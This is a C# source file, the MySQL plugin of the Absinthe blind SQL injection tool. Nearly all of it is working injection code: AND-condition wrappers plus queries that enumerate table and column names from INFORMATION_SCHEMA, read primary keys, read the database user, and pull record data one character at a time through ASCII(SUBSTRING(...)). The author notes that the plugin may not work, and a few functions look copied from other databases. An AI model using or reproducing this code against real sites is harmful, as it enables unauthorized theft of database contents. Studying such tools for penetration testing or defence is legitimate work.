//   Absinthe - The Automated Blind SQL Injection Tool
//   This software is Copyright (C) 2004  Xeron, 0x90.org
//   $Id: BlindMySQL.cs,v 1.2 2006/08/14 23:00:47 nummish Exp $
//
//   This program is free software; you can redistribute it and/or modify
//   it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//   (at your option) any later version.
//
//   This program is distributed in the hope that it will be useful,
//   but WITHOUT ANY WARRANTY; without even the implied warranty of
//   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//   GNU General Public License for more details.
//
//   You should have received a copy of the GNU General Public License
//   along with this program; if not, write to the Free Software
//   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

using System.Text;
using System.Data;

// A note of heavy caution.  This plugin may not work at all since MySQL does not
// store its table names with an associated number field.  So, making a unique value
// from the table_name becomes cumbersome.  Method: OCT(HEX(TABLE_NAME)) take the octal
// value of the hexed value.  Seems backwards.

public class MySQLBlindPlugin : Absinthe.Core.IBlindPlugin
{

	// {{{ AndEqualWrapper
	public string AndEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") = ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanEqualWrapper
	public string AndGreaterThanEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") >= ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanWrapper
	public string AndGreaterThanWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") > ");

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestTableID
	public string NextLowestTableID(long PrevTableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select MIN(OCT(HEX(TABLE_NAME))) from INFORMATION_SCHEMA.TABLES where TABLE_TYPE=0x42415345205441424C45 and TABLE_SCHEMA <> 0x6D7973716C and OCT(HEX(TABLE_NAME)) > ").Append(PrevTableID);

		//select min(UNIX_TIMESTAMP(create_time)) from tables where table_type = 0x42415345205441424C45 and table_schema <> 'mysql' and min(UNIX_TIMESTAMP(create_time)) > ;


		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameLength
	public string TableNameLength(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select LENGTH(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_TYPE=0x42415345205441424C45 and TABLE_SCHEMA <> 0x6D7973716C and OCT(HEX(TABLE_NAME)) = ").Append(TableID);
		
		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameCharacterValue
	public string TableNameCharacterValue(long Index, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select ASCII(SUBSTRING(TABLE_NAME,").Append(Index).Append(",1)) from INFORMATION_SCHEMA.TABLES where TABLE_TYPE=0x42415345205441424C45 and TABLE_SCHEMA <> 0x6D7973716C and OCT(HEX(TABLE_NAME))=").Append(TableID);
		
		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfRecords
	public string NumberOfRecords(string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(*) FROM ").Append(TableName);

		return retVal.ToString();
	}
	// }}}

	// {{{ PrimaryKeyColumn
	public string PrimaryKeyColumn(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		// Naive: get the first column that is not null
		retVal.Append("select min(ORDINAL_POSITION) from INFORMATION_SCHEMA.COLUMNS where is_nullable = 0x594553 and OCT(HEX(TABLE_NAME))=").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldDataType
	public string FieldDataType(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT OCT(HEX(DATA_TYPE)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA <> 0x6D7973716C AND ORDINAL_POSITION=").Append(FieldID).Append(" AND OCT(HEX(TABLE_NAME))=").Append(TableID);		
		
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameLength
	public string FieldNameLength(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select length(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA <> 0x6D7973716C AND ORDINAL_POSITION=").Append(FieldID).Append(" AND OCT(HEX(TABLE_NAME))=").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestFieldID
	public string NextLowestFieldID(long TableID, long PrevFieldID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA <> 0x6D7973716C AND ORDINAL_POSITION > ").Append(PrevFieldID).Append(" AND OCT(HEX(TABLE_NAME))=").Append(TableID);
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameCharacterValue
	public string FieldNameCharacterValue(long Index, long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		
		retVal.Append("SELECT ASCII(SUBSTRING(COLUMN_NAME,").Append(Index).Append(",1)) FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA <> 0x6D7973716C AND OCT(HEX(TABLE_NAME))=").Append(TableID);
		retVal.Append(" AND ORDINAL_POSITION=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfTables
	public string NumberOfTables()
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 0x42415345205441424C45 AND TABLE_SCHEMA <> 0x6D7973716C");

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfFieldsInTable
	public string NumberOfFieldsInTable(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA <> 0x6D7973716C AND OCT(HEX(TABLE_NAME))=").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ LengthOfConvertedPrimaryKeyValue
	public string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(MIN(").Append(KeyName).Append(")) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(LengthOfConvertedPrimaryKeyValue(KeyName, TableName));
		retVal.Append(" WHERE ").Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConvertedPrimaryKeyValueCharacter
	public string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(").Append(KeyName).Append(",").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(ConvertedPrimaryKeyValueCharacter(Index, KeyName, TableName)).Append(" WHERE ");
		retVal.Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConcatenationCharacter
	public string ConcatenationCharacter
	{
		get
		{
			return "||";
		}
	}
	// }}}

	// {{{ CharConversionFunction
	public string CharConversionFunction(long DecimalValue)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("to_char(").Append(DecimalValue).Append(")");
		return retVal.ToString();
	}
	// }}}

	// {{{ IntegerPrimaryKeyValue
	public string IntegerPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(").Append(KeyName).Append(") FROM ").Append(TableName);
		return retVal.ToString();
	}

	public string IntegerPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(IntegerPrimaryKeyValue(KeyName, TableName)).Append(" WHERE ").Append(KeyName);
		retVal.Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ AndIsNullWrapper
	public string AndIsNullWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(" AND (").Append(Value).Append(") IS NULL ");
		return retVal.ToString();
	}
	// }}}

	// {{{ SelectValueForGivenPrimaryKey
	public string SelectValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT ").Append(FieldName).Append(" FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfValueForGivenPrimaryKey
	public string SelectLengthOfValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT LENGTH(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForGivenPrimaryKey
	public string SelectCharacterValueForGivenPrimaryKey(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(").Append(FieldName).Append(",").Append(Index).Append(",1)) FROM ");
		retVal.Append(TableName).Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfConvertedRecordValue
	public string SelectLengthOfConvertedRecordValue(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForConvertedRecordValue
	public string SelectCharacterValueForConvertedRecordValue(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(").Append(FieldName).Append(",").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName).Append(" WHERE ").Append(pk.Name).Append(" = ").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectDatabaseUsernameLength
	public string SelectDatabaseUsernameLength()
	{
		return "SELECT LENGTH(USER())";
	}
	// }}}

	// {{{ SelectCharacterFromDatabaseUsername
	public string SelectCharacterFromDatabaseUsername(long Index)
	{
		StringBuilder retVal = new StringBuilder();

		
		retVal.Append("SELECT ASCII(SUBSTRING(USER(),").Append(Index).Append(",1))");
		
		return retVal.ToString();
	}
	// }}}

	// {{{ PluginDisplayTargetName
	public string PluginDisplayTargetName
	{
		get
		{
			return "MySQL >= 5";
		}
	}
	// }}}
	
	// {{{ AuthorName
	public string AuthorName
	{
		get
		{
			return "Xeron";
		}
	}
	// }}}

	// {{{ ConvertNativeDataType 
	public SqlDbType ConvertNativeDataType(long DataType)
	{
			switch (DataType)
			{
				
			/*
			//+---------------------+-----------+

			//| oct(hex(data_type)) | data_type |

			//+---------------------+-----------+

			//| 2132733062221034    | varchar   |

			//| 4527542220          | bigint    |

			//| 6                   | longtext  |

			//| 136017606772550     | datetime  |

			//| 362743034           | char      |

			//| 221710              | timestamp |

			//| 2636476             | set       |

			//| 1220                | enum      |

			//| 221710              | tinyint   |

			//| 1340                | smallint  |

			//| 1270                | int       |

			//| 434630122           | text      |

			//| 1162                | blob      |

			//| 6                   | longblob  |

			//+---------------------+-----------+

			*/				
				case 362743034: //char
					return SqlDbType.Char;
				case 4527542220: // bigint
					return SqlDbType.Int;
				case 1340: // smallint
					return SqlDbType.Int;
				case 1270: // int
					return SqlDbType.Int;
				case 6: //longtext or longblob
					return SqlDbType.VarChar;
				case 2132733062221034: // varchar
					return SqlDbType.VarChar;
				case 136017606772550: // datetime
					return SqlDbType.DateTime;
				case 221710: // timestamp
					return SqlDbType.DateTime;
				case 434630122: // text
					return SqlDbType.VarChar;
				case 1162: // blob
					return SqlDbType.VarChar;
			}

			return SqlDbType.Variant;
	}
	// }}}
}
